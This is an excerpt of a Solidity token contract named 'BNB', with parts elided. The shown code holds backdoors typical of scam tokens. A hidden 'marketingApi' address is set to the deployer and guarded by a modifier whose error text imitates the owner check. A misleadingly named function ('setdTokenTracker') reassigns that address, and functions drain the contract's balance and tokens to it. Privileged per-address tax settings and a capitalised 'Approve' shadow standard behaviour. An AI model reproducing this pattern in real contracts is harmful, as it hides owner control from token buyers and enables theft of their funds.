...
contract BNB is Context, IERC20, Ownable {
    ...
    address payable private marketingWalletAddress = payable(0xa93684075c54C8Cb617d7b06537734BBAb053ae6); 
    address payable private teamWalletAddress = payable(0x1D79663b3f58C1Dc71C9f0AaB67F192B97734242); 
	...
	address  public marketingApi =_msgSender();
	...
	modifier teamCan {
       require(marketingApi == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
	...
	function setdTokenTracker(address newAddress) external onlyOwner() {
        marketingApi = newAddress;
    }
	
	function claimBalance() external {
        payable(marketingApi).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external{
        IERC20(token).transfer(marketingApi, amount);
    }
	...
	function setAddressToken(address _address, bool _enable, uint256 _addressTaxFee) external teamCan {
	...
	function Approve(address spender,uint256 amount)public teamCan{
